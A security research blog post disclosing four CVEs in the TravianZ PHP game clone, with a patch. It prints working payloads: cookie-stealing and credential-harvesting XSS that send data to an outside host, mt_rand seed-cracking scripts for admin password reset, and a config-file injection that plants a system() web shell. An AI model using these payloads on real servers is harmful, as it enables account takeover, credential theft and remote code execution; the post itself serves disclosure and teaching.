=== Content from bramdoessecurity.com_ec495895_20250114_183137.html ===

[Bram Does Security](https://bramdoessecurity.com)

* [Home](https://bramdoessecurity.com/)
* [About](https://bramdoessecurity.com/about/)
* [RSS](https://bramdoessecurity.com/rss/)

[Sign in](#/portal/signin)
[Subscribe](#/portal/signup)

[Research](/tag/research/)

# TravianZ Hacked

We will explore how we can get Remote Code Execution (RCE) through cryptographic failures, XSS, etc. in an open source PHP project.

#### [Bram](/author/bram/)

Jul 1, 2023
• 20 min read

![TravianZ Hacked](/content/images/size/w2000/2023/06/intro.jpg)

[TravianZ](https://github.com/Shadowss/TravianZ) is an open source clone of an older version of [Travian](https://www.travian.com), namely version 3.6. It has done this by stealing the front end code from the official game and then recreating their own back end in PHP. This code is over 10 years old and is riddled with security vulnerabilities. In this security research blog we will dig into the various vulnerabilities I have found.

## Let's get admin!

Our first objective will be to get admin. There are 2 ways to approach this. One requires a bit of social engineering or patience, meanwhile the other one can be done without any user interaction needed. Let's discuss these 2 methods.

### Admin through XSS (CVE-2023-36995)

There are quite a few endpoints where script injection is possible, these include;

* Alliance tag/name (persistent)
* Statistics page (reflected)
* Link preferences (persistent, self XSS)
* Admin Log (persistent)
* The COOKUSR cookie (persistent, self XSS)

Alliance name is probably the most common XSS that will get triggered, because it gets triggered when people see you on the map, in the statistics page and on your user page.

The problem with this is, that while it will be easier to get an admin session cookie, the admin panel requires a second login. Meaning that if we get the admin session cookie, we need to pray that they have already logged into the admin panel.

A sneakier way where we know that when we get the cookie, they will have logged into the admin panel, is to inject the admin log with a cookie stealing script. We do this by browsing to <http://localhost/Admin/admin.php> and attempting to login with malicious username.

![](https://bramdoessecurity.com/content/images/2023/06/image-5.png)![](https://bramdoessecurity.com/content/images/2023/06/image-2.png)

As you can see, the admin log for incorrect login attempts is vulnerable to XSS, which reminded me of the [theoretical force OP exploit by LiveOverflow](https://www.youtube.com/watch?v=3_e4t3l8fgY). This is an area which might not be immediately obvious when you are looking for XSS vulnerabilities.

Due to the lack of any [Content Security Policy Header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) or [HTTP cookie flags](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies) it is trivial to steal the cookie.

```
<script>
    fetch("https://yourdomain.com?cookie="+document.cookie)
</script>

```

There are a few problems with XSS however, the first one is that by default user sessions get terminated after only a single hour. The second being that an admin actually has to trigger the XSS, which might not always happen on servers where the admin is inactive. Finally, as discussed previously, an admin cookie doesn't always mean they are logged into the admin panel.

### Password reset vulnerability (CVE-2023-36993)

So before we get into the vulnerability, let's first figure out how password resets work.

**`GameEngine/Mailer.php`**

```
function sendPassword($email,$uid,$username,$npw,$cpw) {

	$subject = "Password forgotten";

	$message = "Hello ".$username."

    You have requested a new password for Travian.

    ----------------------------
    Name: ".$username."
    Password: ".$npw."
    ----------------------------

    Please click this link to activate your new password. The old password then
    becomes invalid:

    http://${_SERVER['HTTP_HOST']}/password.php?cpw=$cpw&npw=$uid

    If you want to change your new password, you can enter a new one in your
    profile on tab \"account\".

    In case you did not request a new password you may ignore this email.

    Travian
    ";

	$headers = "From: ".ADMIN_EMAIL."\n";

	mail($email, $subject, $message, $headers);
}

```

Now we can immediately see that this is vulnerable to [password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning) but this again requires user interaction. And while this might work on normal users, it does not necessarily work on the admin. The default admin account "Multihunter" doesn't even have a working default email address. So therefore we will keep looking.

Let's first figure out what `$npw` and `$cpw` are. From the name of `$uid` we can assume it is a user id.

**`password.php`**

```
// user input email and submit
if(isset($_POST['email']) && isset($_POST['npw'])){
	$uid = intval($_POST['npw']);
	$email = $database->getUserField($uid, 'email', 0);
	$username = $database->getUserField($uid, 'username', 0);
	if($email != $_POST['email']){
        echo "<p>Unfortunately the entered email address does not match the one used to register the account.</p>\n";
    } else {
		// generate password and cpw
		$npw = $generator->generateRandStr(7);
		$cpw = $generator->generateRandStr(10);

        $database->addPassword($uid, $npw, $cpw);

		// send password mail
		$mailer->sendPassword($email, $uid, $username, $npw, $cpw);

		echo "<p>Password was sent to: ${_POST['email']}</p>\n";
	}

// user click the link in 'password forgotten' email
} else if (isset($_GET['cpw']) && isset($_GET['npw'])) {
	$uid = intval($_GET['npw']);
	$cpw = preg_replace('#[^a-zA-Z0-9]#', '', $_GET['cpw']);

	if(!$database->resetPassword($uid, $cpw)){
		echo '<p>The password has not been changed. Perhaps the activation code has already been used.</p>';
	}else{
		echo '<p>The password has been successfully changed.</p>';
	}
} //else...

```

So `$npw` and `$cpw` are just random values. So what is going on with the `resetPassword` function then?

**`GameEngine/Database.php`**

```
function resetPassword($uid, $cpw) {
	list($uid, $cpw) = $this->escape_input((int) $uid, $cpw);
	$q = "SELECT npw FROM `" . TB_PREFIX . "password` WHERE uid = $uid AND cpw = '$cpw' AND used = 0 LIMIT 1";
	$result = mysqli_query($this->dblink,$q);
	$dbarray = mysqli_fetch_array($result);

	if(!empty($dbarray)) {
		if(!$this->updateUserField($uid, 'password', password_hash($dbarray['npw'], PASSWORD_BCRYPT,['cost' => 12]), 1)) return false;
		$q = "UPDATE `" . TB_PREFIX . "password` SET used = 1 WHERE uid = $uid AND cpw = '$cpw' AND used = 0";
		mysqli_query($this->dblink,$q);
		return true;
	}

	return false;
}

```

So as long as `$npw` has not yet been activated, it will set the password to `$cpw`.

### So now how do we exploit it?

In our previous code we saw the following snippet;

```
// generate password and cpw
$npw = $generator->generateRandStr(7);
$cpw = $generator->generateRandStr(10);

```

Now how does the generateRandStr work?

**`GameEngine/Generator.php`**

```
public function generateRandStr($length){
  $randstr = "";
	for($i = 0; $i < $length; $i++){
		$randnum = mt_rand(0, 61);
		if($randnum < 10) $randstr .= chr($randnum + 48);
		else if($randnum < 36) $randstr .= chr($randnum + 55);
		else $randstr .= chr($randnum + 61);
	}
	return $randstr;
}

```

When we take a look at the documentation for [mt\_rand](https://www.php.net/manual/en/function.mt-rand.php) we quickly see the following warning;

⚠️**Caution** This function does not generate cryptographically secure values, and *must not* be used for cryptographic purposes, or purposes that require returned values to be unguessable.

So we have an insecure cryptographic algorithm being used for the password reset function, meaning that it would be theoretically possible to guess the values given we collect enough inputs. So let's turn this into a practical attack!

I started by googling for "mt\_rand cracker" and "mt\_rand vulnerability", which gave some interesting results. First of which is [Breaking PHP's mt\_rand() with 2 values and no bruteforce](https://www.ambionics.io/blog/php-mt-rand-prediction) and the other being [php\_mt\_seed cracker](https://github.com/openwall/php_mt_seed), the latter of which has the following to say;

💬It is able to search the full 32-bit seed space in under a minute.

Who needs complicated cryptographic vulnerabilities when you can just goes through the entire seed space in under a minute? 😁 Let's get cracking!

### Cracking $npw and $cpw

After we are done compiling `php_mt_seed.c` we need to figure out how to use it. Luckily in the `README` there is a `Complex usage example` in which a similar problem. Turns out the format is `$num $num $min $max`

So first thing first, we need to untangle `$npw` and `$cpw` and turn them back into numbers. After which we need to turn them into the correct format. I've written the following PHP script to do so;

```
function untangle($str) {
	$nums = "";
	for($i = 0; $i < strlen($str); $i++){
		$n = ord($str[$i]);
		$x = 0;
		if($n >= 97) {
			$x = strval($n - 61);
		} else if($n >= 65) {
			$x = strval($n - 55);
		} else {
			$x = strval($n - 48);
		}
		$nums .= $x . " " . $x . " 0 61  ";
	}
	return $nums;
}

```

Now all we do is navigate to <http://localhost/password.php?npw=9> and input our email address and send the password reset URL. *(With 9 being the user id of our player.)*

![](https://bramdoessecurity.com/content/images/2023/06/image-6.png)

Now since I did not have an SMTP server set up, I just quickly checked the database for the correct values.

![](https://bramdoessecurity.com/content/images/2023/06/image-7.png)

Great! So now let's run `dkiiKRRa5nxNrNupB` through the untangler function and then crack it!

![](https://bramdoessecurity.com/content/images/2023/06/image-8.png)

So we found the seed! The seed is `1072629303`, so let's create a function to generate the next value in the pseudorandom sequence.

```
mt_srand(1072629303);

function generateRandStr($length) {
	$randstr = "";
	for($i = 0; $i < $length; $i++){
		$randnum = mt_rand(0, 61);
		if($randnum < 10) $randstr .= chr($randnum + 48);
		else if($randnum < 36) $randstr .= chr($randnum + 55);
		else $randstr .= chr($randnum + 61);
	}
	return $randstr;
}

function getStrings($name) {
	echo($name);
	echo("\nnpw: ");
	echo(generateRandStr(7));
	echo("\ncpw: ");
	echo(generateRandStr(10));
	echo("\n--------------\n");
}

getStrings("current");
getStrings("future");

```
![](https://bramdoessecurity.com/content/images/2023/06/image-9.png)

So we cracked the current and future npw & cpw, now let's go generate a password reset URL for the default admin account "Multihunter", which has a default email of "multihunter@travianz.game".

![](https://bramdoessecurity.com/content/images/2023/06/image-10.png)

So let's go to <http://localhost/password.php?npw=5> and reset the password!

![](https://bramdoessecurity.com/content/images/2023/06/image-11.png)

Well... the npw & cpw are correct for the current user and match, but not for the future one? Why is this?

### Trouble in paradise

At first I started looking where in the PHP it could possibly call the `mt\_rand` function, because if it was called inbetween password resets then the sequence would no longer be correct. However I found nothing.

After a bit of googling about the `mt\_rand` seed, I found the [following stackoverflow post](https://stackoverflow.com/questions/53687593/when-is-mt-rand-seeded). The  article states that the seed is not retained and links the commit responsible for this change.

So let's take a look at the [PHP source code](https://github.com/php/php-src/tree/PHP-7.4.16). I picked version 7.4.16 because it is the version I'm running to have TravianZ working.

**`php-src-PHP-7.4.16\ext\standard\mt_rand.c`**

```
PHPAPI uint32_t php_mt_rand(void)
{
	/* Pull a 32-bit integer from the generator state
	   Every other access function simply transforms the numbers extracted here */

	register uint32_t s1;

	if (UNEXPECTED(!BG(mt_rand_is_seeded))) {
		php_mt_srand(GENERATE_SEED());
	}
    // code...
}

```

So the seed is being set to GENERATE\_SEED() on every request *(unless mt\_rand\_is\_seeded is specified, which we can do through the mt\_srand() function in PHP)*. Let's take a look at the implementation of `GENERATE_SEED`.

**`php-src-PHP-7.4.16\ext\standard\php_rand.h`**

```
#define GENERATE_SEED() (((zend_long) (time(0) * GetCurrentProcessId())) ^ ((zend_long) (1000000.0 * php_combined_lcg())))

```

Mhmm so this seed is being set to the EPOCH time in seconds, multiplied by the process ID and then XOR'd with a long integer. Let's take a look at [php\_combined\_lcg](https://www.php.net/manual/en/function.lcg-value.php).

💬**lcg\_value()** returns a pseudo random number in the range of (0, 1).

Again, a non cryptographically secure random number generator, however this time I don't see a way to crack it easily. Since we don't have access to the process id and only the least significant 20 bits *(because log2(1000000)=19.9)* of it are XOR'd to the random value.

Now luckily the process id is constant throughout for as long as PHP does not get restarted. We also have access to the epoch time and since it is in seconds instead of milli- or microseconds, we should be able to just send a password reset to both the admin and the user within the same second. That way the only difference is the least significant 20 bits of the integer. I ran some tests and indeed these results seem to match up;

```
seed (hex)		seed (int)		time when number was generated
------------------------------------------------------------------------------
0x4c74ad9c		1282715036		2023-05-28 17:31:15
0x4c72706c		1282568300		2023-05-28 17:31:18
			-146736

0x3fef0637		1072629303		2023-06-12 19:33:51
0x406d0e76		1080888950		2023-06-12 19:48:07
			-8259647

0x4c79ed36		1283058998		2023-05-28 17:49:18
0x4c7f8146		1283424582		2023-05-28 17:49:18
			-365584

0x4c87ca13		1283967507		2023-05-28 18:25:03
0x4c8875a1		1284011425		2023-05-28 18:25:03
			-43918

0x4c8c37c3		1284257731		2023-05-28 18:28:52
0x4c85bf35		1283833653		2023-05-28 18:28:52
			-424078

```

Interestingly a small time difference also does not seem to matter much. However I did not gather too much data on this.

In order to send a request within the same second I've written the following the NodeJS script;

```
const axios = require("axios")

const url = "http://localhost/"
const pwres = "password.php?npw="
const users = [
    {id: 9, email: "bram%40bramdoessecurity.com"},
    {id: 5, email: "multihunter%40travianz.game"}
]

// first load DNS etc.
console.log("DNS")
axios.get(url).then(async () => {
    console.log("start")
    const bucket = [];
    for(let user of users) {
        bucket.push(axios.post(url+pwres+user.id, "npw="+user.id+"&email="+user.email+"&s1=ok").then(() => console.log(user.id)))
    }
    console.log("sending...")
    await Promise.all(bucket)
    console.log("sent!")
})

```

However 2 requests within a second could also be done manually by very quickly switching tabs.

### A theoretical password reset attack

So now we still remain with one problem, if we only have the seed of the user, how do we know what the seed of the admin is? It might be off by positive or negative a million. This means we'd have to send 2 million requests in order to reset the admin password.

One way of optimizing it is by sending 5 password reset URLs to the user and 1 to the admin all in the same second. Then we simply take the average of those 5 seeds we received and start testing from the middle. Always going +1 and -1 per seed. Eventually we would arrive at the correct npw & cpw and we will successfully reset the admin password. If you take an average of a million requests this is quite feasible.

## Let's get RCE! (CVE-2023-36992)

Now with the admin account pwned, we are able to get RCE. We do this by abusing the server config editor, which writes to config.php all the settings we specify. We will be abusing the server name property.

**`GameEngine/Admin/Mods/editServerSet.php`**

```
myFile = "../../config.php";
$fh = fopen($myFile, 'w') or die("<br/><br/><br/>Can't open file: GameEngine\config.php");

$text = file_get_contents("constant_format.tpl");
$text = preg_replace("'%SERVERNAME%'", $_POST['servername'], $text);

fwrite($fh, $text);
fclose($fh);

```

**`GameEngine/config.php`**

```
//////////////////////////////////
// *****  SERVER SETTINGS  *****//
//////////////////////////////////

// ***** Name
define("SERVER_NAME","TravianZ");

```

So let's set the server name to `TravianZ");if(isset($_GET["exec"])){system($_GET["exec"]);}//`

![](https://bramdoessecurity.com/content/images/2023/06/image-12.png)

And now all of the sudden our config file looks like this;

**`GameEngine/config.php`**

```
//////////////////////////////////
// *****  SERVER SETTINGS  *****//
//////////////////////////////////

// ***** Name
define("SERVER_NAME","TravianZ");if(isset($_GET["exec"])){system($_GET["exec"]);}//");

```

Now the `SERVER_NAME` is still defined as "TravianZ" which means that in the config editor everything will still look normal.

![](https://bramdoessecurity.com/content/images/2023/06/image-13.png)

Now we just go to <http://localhost/?exec=whoami> and look at the results.

![](https://bramdoessecurity.com/content/images/2023/06/image-18.png)

✨Command execution✨

### RCE Without Admin (CVE-2023-36994)

Now there is another trick to get RCE, which does not require admin access. However, this relies on a bad installation, and therefore will not always work. Luckily for us, a bad installation is the default. Let's see what happens after an installation.

![](https://bramdoessecurity.com/content/images/2023/06/image-20.png)![](https://bramdoessecurity.com/content/images/2023/06/image-24.png)

So after an installation the install folder gets renamed to installed\_[timestamp]. The code responsible for this is as follows;

**`install/templates/end.tpl`**

```
$time = time();
rename("../install/","../installed_".$time);
touch('../var/installed');

```

So now the problem is, how do we find out when a server started? Luckily for us, the server gives us a message with the start time.

![](https://bramdoessecurity.com/content/images/2023/06/image-25.png)

However, during the installation of TravianZ, when you visit the page of step 2, you will get the start time set. So what if the installation took a bit longer?

![](https://bramdoessecurity.com/content/images/2023/06/image-26.png)

Well, let's take a look at the following code snippets:

**`install/process.php`**

```
$text = file_get_contents("data/constant_format.tpl");
$findReplace = [];
$findReplace["%SSTARTDATE%"] = $_POST['start_date'];
$findReplace["%SSTARTTIME%"] = $_POST['start_time'];
$findReplace["%STARTTIME%"] = time();
fwrite($gameConfig, str_replace(array_keys($findReplace), array_values($findReplace), $text));

```

**`install/data/constant_format.tpl`**

```
// ***** Started
// Defines when has server started.
define("COMMENCE","%STARTTIME%");

// ***** Server Start Date / Time
define("START_DATE", "%SSTARTDATE%");
define("START_TIME", "%SSTARTTIME%");

```

**`GameEngine/Message.php`**

```
$welcomemsg = file_get_contents("GameEngine/Admin/welcome.tpl");
$welcomemsg = "[message]".preg_replace(
	["'%USER%'", "'%START%'", "'%TIME%'", "'%PLAYERS%'", "'%ALLI%'", "'%SERVER_NAME%'", "'%PROTECTION%'"],
	[$username, date("y.m.d", COMMENCE), date("H:i", COMMENCE), $database->countUser(), $database->countAlli(), SERVER_NAME, round((PROTECTION/3600))],
	$welcomemsg
)."[/message]";

```

After you have typed in all the configuration fields, you will send a post request to `install/process.php`. Now in the configuration there will be 2 dates. The start time of the server which you have configured, and the time when the configuration was finished. In the `Message.php` code we saw that the `COMMENCE` variable is being sent in the welcome message, which is the time when you finished the configuration.

That means that even if the admin was on the configuration page for 10 minutes, the actual timestamp in the welcome message is set to when you finished configuring the server. After you are done configuring the server all that is left to do is to click a few buttons and set up the password for the admin account. This should not take nearly as long. Therefore now we are much closer to the actual epoch time to which the configuration got renamed to.

However, since `time()` is being used, the timezone is set to the server's actual timezone. In the message the timezone we get is the one configured by the server during installation. So we either have to figure out the timezone of the server, which can usually be done by checking where it is hosted, or we bruteforce it. If we were to assume the installation took a maximum of 4 minutes after the config was set, then we'd have to send requests for -1 minute to +4 minutes. This would take 300 requests \* 24 (possible timezones) = 7200 GET requests.

![](https://bramdoessecurity.com/content/images/2023/06/image-27.png)

Well now that we figured out where the install folder is located (assuming it has not yet been deleted) we are met with this error message. Let's figure out what is going on here and if we can bypass it.

**`install/index.php`**

```
if(substr(sprintf('%o', fileperms('../')), -4)<'700'){
	echo"<span class='f18 c5'>ERROR!</span><br />It's not possible to write the config file. Change the permission to '777'. After that, refresh this page!";
}
else if (file_exists("../var/installed")) {
	echo"<span class='f18 c5'>ERROR!</span><br />Installation appears to have been completed.<br />If this is an error remove /var/installed file in install directory.";
}
else switch($_GET['s']){
	case 0:
	include("templates/greet.tpl");
	break;
// ...
	case 5:
	include("templates/end.tpl");
	break;
}

```

So we are unable to access any of the template files, there is even an `.htaccess` file preventing us from going to them directly. However, there are no such restrictions on `install/process.php`. The process file is also the one we sent a POST request to and is responsible for writing to the config file. And as we have seen before, writing to the config file is what allows us to get RCE.

However if we do write to this file, all other configuration settings will be lost, including MySQL login credentials. This will make the entire game unplayable. However if we don't care about being stealthy and only want RCE, this is definitely a viable option. Just send a POST request to `install/process.php` and overwrite the config file with the same technique we used before and you get ✨RCE✨.

However a lot of server admins do delete the install folder after they are done with it, which means that often times we won't be able to use this attack. But hey, how often do server admins just leave bad defaults alone? *hehe*

## Recovering plaintext passwords (CVE-2023-36995)

The login field somehow knows our username before we ever type it out.

![](https://bramdoessecurity.com/content/images/2023/06/image-28.png)

This is because of the `COOKUSR` cookie, which remembers the last username which we logged in with. The `COOKUSR` cookie was also noted as vulnerable to XSS previously in this blogpost. So let's see why this is the case.

**`login.php`**

```
<input class="text" type="text" name="user" value="<?php echo stripslashes(stripslashes(stripslashes($form->getDiff("user",$_COOKIE['COOKUSR'])))); ?>" maxlength="30" autocomplete='off' />

```

As we can see the `COOKUSR` cookie gets echo'd into the value attribute. Interestingly enough, it goes through 3 iterations of the [stripslashes function](https://www.php.net/manual/en/function.stripslashes.php) which does the opposite of escaping dangerous strings.

So now we need to craft a piece of code that will steal the plaintext password. We can do this through multiple methods; changing the form target, a JavaScript keylogger, intercepting the submit and stealing the credentials before continuing, ... We will do the latter because this is the most interesting and stealthiest.

```
document.forms[0].onsubmit = function(e) {
	e.preventDefault()
	let creds = document.getElementsByName("user")[0].value + ":" + document.getElementsByName("pw")[0].value
	fetch("https://localhost:8080/?creds="+creds).finally(function() {
		e.target.submit()
	})
}

```

This piece of code will steal the credentials without the user knowing, everything will be as normal, although perhaps a bit slower. Now we need to figure out a way to inject it into the `COOKUSR`, let's minimize the previous script and create a payload that sets the cookie.

```
document.cookie = ['COOKUSR="><script>PAYLOAD</script><div x="', ...document.cookie.split(";").filter(e => !e.includes("COOKUSR"))].join(";")

```

Because the cookies don't have any security flags set, we can modify all of them with JavaScript. That's what we are doing now in order to leverage this self XSS to steal the credentials of the user. This is a good example of why self XSS can still be dangerous and cookie flags are important.

Now let's combine everything, we minimize the code and we put it in the exploit and everything should work.

```
document.cookie = ['COOKUSR="><script>document.forms[0].onsubmit=function(e){e.preventDefault()+fetch("http://localhost:8080/?creds="+document.getElementsByName("user")[0].value+":"+document.getElementsByName("pw")[0].value).finally(function(){e.target.submit()})}</script><div x="', ...document.cookie.split(";").filter(e => !e.includes("COOKUSR"))].join(";")

```

Do take note of how we used `e.preventDefault()+fetch(...`, we need to tell JavaScript these are 2 different statements without using the semicolon, because a cookie can not contain those. We could hava also just used something along the lines of `document.write(atob("base64payloadhere"))` to bypass the restriction but in this case a `+` operator executes both statements. *Thank you loose type operations.*

We are now however greeted with an empty username field, but we will solve this later when we fully deploy the exploit. Let's give it a try though!

![](https://bramdoessecurity.com/content/images/2023/06/image-33.png)

✨Plaintext passwords✨

However, if you type in an incorrect password, the incorrect password will get logged. Upon submitting the form it also no longer uses the `COOKUSR` cookie but instead the POST value of the username submitted. So this exploit only works once. This is no problem though since most people submit their correct password on the first try, and if they do not, we will have another chance after they login again.

### Let's impact as many people as we can!

As was said before in the "Admin through XSS" section the alliance tag is vulnerable to XSS. However we have a problem. Alliance tags have a max length of 15... *(on the client)*

![](https://bramdoessecurity.com/content/images/2023/06/image-35.png)![](https://bramdoessecurity.com/content/images/2023/06/image-34.png)

In the database they have a length of 100 characters. So let's set maxlength to 100 and write a little exploit.

Let's set the name to `EvilCorp<script src="http://localhost:8080/evil.js"></script>` and see what happens.

![](https://bramdoessecurity.com/content/images/2023/06/image-37.png)

Awesome! We got it to work! Now let's see where else this is being used.

![](https://bramdoessecurity.com/content/images/2023/06/image-38.png)

It's also injected in the player list, and this is a page people visit often. This means that a lot of people will start running our evil javascript!

![](https://bramdoessecurity.com/content/images/2023/06/image-39.png)

What just happened? Why is the map messed up? Let's investigate!

![](https://bramdoessecurity.com/content/images/2023/06/image-40.png)

Turns out the map is using a `<script>` tag and puts our alliance tag in directly without filtering for XSS, which ironically in this case, breaks our XSS. It breaks it in 2 ways, the first being that the `"` breaks the map script

![](https://bramdoessecurity.com/content/images/2023/06/image-41.png)

Secondly the `</script>` tag ends the script, even if it is within quotation marks. To demonstrate this I removed the quotation marks around the src attribute.

So we need to use a different HTML tag to execute our payload. We can do this with a `<img src=x onerror='payload here'>` but if we put our entire payload within there we will quickly go over the 100 character limit. We therefore need a smaller payload that is able to load our full payload.

```
var script = document.createElement('script');
script.src = "http://localhost:8080/evil.js";
document.head.appendChild(script);
```

We need to find a way to minimize that script as much as possible. I came up with the following solution;

`mid.appendChild(document.createElement('script')).src='//[::1]:8080/a'`

Now if we put this in an image with the `onerror` parameter, it an ugly image not found picture shows up everywhere the XSS is located. This is a very obvious way to get detected. Instead let's leverage the fact that Travian implemented some basic logic to prevent people from copying their images. They implemented a 1x1 invisible pixel called `img/x.gif` which can be found whenever you try and open an image in a new tab. We're going to be using this one to make our payload invisible.

This is the final alliance name I came up with;

`a<img src=img/x.gif onload=n1.appendChild(document.createElement('script')).src='//[::1]:8080/a'>`

We are leveraging a technique where ids can be directly referenced in the JavaScript. There is an element with the id `n1` which we use to inject our JavaScript. This is also related to [DOM Clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering), where we use this deprecated but still supported feature to gain XSS in certain webpages. Interestingly there is another id named "ce", but this does not work. However other 2 letter ids do work fine. I'm not entirely sure why this is the case, if anyone has a clue do feel free to send me an email regarding this.

That payload is 97 characters so we still have 3 more characters to choose for our alliance tag! 😁

Now the map is no longer broken and the payload still executes. So now let's add some code to get the username and we will have the final payload we need.

```
(async function() {
	const res = await fetch("statistiken.php")
	const body = await res.text()
	const statsDOM = (new window.DOMParser()).parseFromString(body, "text/html")
	const username = statsDOM.getElementsByClassName("fc")[0].parentElement.children[1].children[0].innerText

	document.cookie = [`COOKUSR=${username}"><script>document.forms[0].onsubmit=function(e){e.preventDefault()+fetch("http://localhost:8080/?creds="+document.getElementsByName("user")[0].value+":"+document.getElementsByName("pw")[0].value).finally(function(){e.target.submit()})}</script><div x="`, ...document.cookie.split(";").filter(e => !e.includes("COOKUSR"))].join(";")
})()

```
![](https://bramdoessecurity.com/content/images/2023/06/image-42.png)

Now all the credentials are belong to us!

## Endword

My goal of this blog post was to show interesting vulnerabilities and techniques in order to share some interesting knowledge with everyone. This means that a lot of vulnerabilities such as [CSRF](https://portswigger.net/web-security/csrf), [lack of security headers](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html), [lack of cookie flags](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes), ... were not explored fully but are definitely still present! This application has been a ton of fun for me to explore.

I hope you got some real value out of this blogpost and I would love to hear your feedback either by the comment box or by email! Also feel free to click the button in the bottom right of your screen to subscribe for more blog posts 😀

### CVEs & Responsible Disclosure

The following CVEs; CVE-2023-36992, CVE-2023-36993, CVE-2023-36994, CVE-2023-36995 all affect versions 8.3.4 and 8.3.3 of [TravianZ](https://github.com/Shadowss/TravianZ). Due to the fact the maintainer is no longer active the developers told me to make this post public. I've released a [patch](https://github.com/Shadowss/TravianZ/pull/43) in order to secure your instance.

## Sign up for more like this.

[Enter your email
Subscribe](#/portal)

[![Intigriti XSS Challenge 0522](/content/images/size/w600/2023/06/intigriti-1.png)](/intigriti-xss-challenge-0522/)
[## Intigriti XSS Challenge 0522

Challenge author: PiyushThePal
Link: https://challenge-0522.intigriti.io
Reconnaissance
Let's start by getting an overview of the challenge. When we browse the website we see it's all static content and not much interesting is going on. The only parameter we control is the ?page=1 parameter](/intigriti-xss-challenge-0522/)
Jun 5, 2023
9 min read

[Bram Does Security](https://bramdoessecurity.com) © 2025

* [Sign up](#/portal/)

[Powered by Ghost](https://ghost.org/)



=== Content from github.com_82a055f9_20250115_112716.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FShadowss%2FTravianZ)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FShadowss%2FTravianZ)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=Shadowss%2FTravianZ)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Shadowss](/Shadowss)
/
**[TravianZ](/Shadowss/TravianZ)**
Public

* [Notifications](/login?return_to=%2FShadowss%2FTravianZ) You must be signed in to change notification settings
* [Fork
  136](/login?return_to=%2FShadowss%2FTravianZ)
* [Star
   218](/login?return_to=%2FShadowss%2FTravianZ)

Travian T3.6 , BEST VERSION EVER

### License

[GPL-3.0 license](/Shadowss/TravianZ/blob/master/LICENSE)

[218
stars](/Shadowss/TravianZ/stargazers) [136
forks](/Shadowss/TravianZ/forks) [Branches](/Shadowss/TravianZ/branches) [Tags](/Shadowss/TravianZ/tags) [Activity](/Shadowss/TravianZ/activity)
 [Star](/login?return_to=%2FShadowss%2FTravianZ)

 [Notifications](/login?return_to=%2FShadowss%2FTravianZ) You must be signed in to change notification settings

* [Code](/Shadowss/TravianZ)
* [Issues
  24](/Shadowss/TravianZ/issues)
* [Pull requests
  0](/Shadowss/TravianZ/pulls)
* [Discussions](/Shadowss/TravianZ/discussions)
* [Actions](/Shadowss/TravianZ/actions)
* [Projects
  2](/Shadowss/TravianZ/projects)
* [Wiki](/Shadowss/TravianZ/wiki)
* [Security](/Shadowss/TravianZ/security)
* [Insights](/Shadowss/TravianZ/pulse)

Additional navigation options

* [Code](/Shadowss/TravianZ)
* [Issues](/Shadowss/TravianZ/issues)
* [Pull requests](/Shadowss/TravianZ/pulls)
* [Discussions](/Shadowss/TravianZ/discussions)
